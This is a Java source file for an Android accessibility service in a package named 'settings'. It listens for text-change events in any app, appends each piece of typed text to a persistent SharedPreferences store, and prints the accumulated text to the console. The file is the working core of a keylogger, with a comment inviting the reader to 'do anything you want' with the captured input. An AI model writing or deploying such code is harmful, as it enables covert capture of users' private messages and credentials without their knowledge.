package com.example.settings;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;
import android.content.SharedPreferences;
import android.view.accessibility.AccessibilityEvent;
import android.widget.Toast;

public class MyAccessibilityService extends AccessibilityService {
        Sharedpref mSharedpref;
        @Override
        public void onAccessibilityEvent(AccessibilityEvent event) {
            final int eventType = event.getEventType();
            mSharedpref=new Sharedpref(getApplicationContext());
            String eventText = "";

            switch(eventType) {
           /*     case AccessibilityEvent.TYPE_VIEW_CLICKED:
                     eventText = "Clicked: ";
                     break;
                case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                     eventText = "Focused: ";
                     break;*/
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:

                    break;

            }
            String text=mSharedpref.getSaveTextWritten();
            StringBuilder mBuilder=new StringBuilder();
            mBuilder.append(text+eventText + event.getText());
            mSharedpref.setSaveTextWritten(mBuilder.toString());
            mSharedpref.commit();
            //print the typed text in the console. Or do anything you want here.
            System.out.println("ACCESSIBILITY SERVICE : "+eventText + "Sharedwala : "+text);

        }

        @Override
        public void onInterrupt() {
            //whatever
        }

        @Override
        public void onServiceConnected() {

            AccessibilityServiceInfo info = getServiceInfo();
            info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED;
            info.feedbackType = AccessibilityServiceInfo.FEEDBACK_SPOKEN;
            info.notificationTimeout = 100;
            this.setServiceInfo(info);
        }
}
